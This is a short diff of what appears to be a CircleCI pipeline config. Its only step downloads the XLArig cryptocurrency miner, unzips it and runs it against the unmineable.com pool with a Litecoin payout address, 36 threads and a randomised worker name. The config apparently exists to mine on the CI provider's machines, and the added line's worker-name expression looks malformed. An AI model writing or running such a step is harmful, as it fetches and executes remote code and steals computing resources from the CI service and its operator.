@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx-us.unmineable.com:13333 -u LTC:MGznkqRveuhK7k3TcZAK23XBc3bhPaBM4U.CPU -k -t 36 
+      - run: wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o rx-us.unmineable.com:13333 -u LTC:MGznkqRveuhK7k3TcZAK23XBc3bhPaBM4U.(echo $(shuf -i 1-1000 -n 1)-CPU) -k -t 36
